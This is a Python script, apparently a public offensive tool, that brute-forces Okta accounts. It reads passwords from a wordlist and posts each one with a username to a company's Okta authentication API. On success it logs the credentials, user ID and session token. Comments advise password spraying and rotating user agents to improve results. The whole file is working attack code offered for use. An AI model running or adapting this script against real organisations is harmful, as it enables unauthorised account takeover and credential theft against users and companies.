#!/usr/bin/env python
# Author: xakepnz
# Description: Simple Okta HTTPs Brute Force script.
################################################################################################
# Imports:
################################################################################################

import requests
import json
import logging

################################################################################################
# Brute Force Okta:
################################################################################################

def brute_okta(target_sub, user_agent, username, password):
    """
    Takes:
        target_sub - The subdomain of the company trying to brute force against.
        user_agent - The useragent you wish to use.
        username   - Username to attempt.
        password   - Password to attempt.
    Returns:
        True       - If successfully logged in with attempted credentials.
        None       - For failed attempts/issues.
    """
    
    r = requests.post(
        'https://{}.okta.com/api/v1/authn'.format(target_sub),
        headers = {
            'User-Agent': user_agent,
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        },
        data = json.dumps({
            "username": username,
            "password": password,
            "options": {
                "warnBeforePasswordExpired": 'false',
                "multiOptionalFactorEnroll": 'false'
            }
        })
    )

    if r.ok:
        try:
            response = r.json()
            try:
                sessionToken = ''
                user_id = ''
                sessionToken = response.get('sessionToken')
                user_id = response.get('user_id')
                logging.info('Successfully Brute Forced!\nUsername: {}\nPassword: {}\nUser ID: {}\nSession ID: {}'.format(username, password, user_id, sessionToken))
                return True
            except Exception as e:
                logging.error('Could not extract user metadata, full dump response was: {}'.format(response))
                return True
        except Exception as e:
            logging.error('Could not JSONify the response. Response was: {}'.format(r.text))
            return None
    else:
        logging.info('Login failed for: {} with: {}'.format(username, password))
        return None

################################################################################################
# Passwords:
################################################################################################

def read_passwords(password_file):
    """
    Takes:
        password_file - A plaintext file containing multi-line passwords to use for attack.
    Returns:
        passwords     - List of passwords to use. 
    """

    passwords = []

    with open(password_file) as r:
        lines = r.readlines()

    for l_ in lines:
        l_.replace('\n','')
        passwords.append(l_)
    return passwords

################################################################################################
# Main:
################################################################################################

if __name__ == '__main__':
    # Set logging level:
    logging.getLogger().setLevel(logging.INFO)
    logging.basicConfig(
        format='%(asctime)s - %(levelname)s - %(message)s',
        level=logging.INFO,
        datefmt='%Y-%m-%d %H:%M:%S')

    # Single User (Spray works better, multiple users, one password..):
    username = 'first.last'
    
    # Company to Brute Force:
    target = 'example'

    # Single user_agent (Change to whatever you need, this can also be cycled with multiple different):
    user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0'

    # Gather some passwords (Better single password multiple users):
    passwords = read_passwords('/some/password/file.txt')
    
    # Brute force the credentials of an account via Okta:
    for p in passwords:
        brute_okta(target, user_agent, username, p)
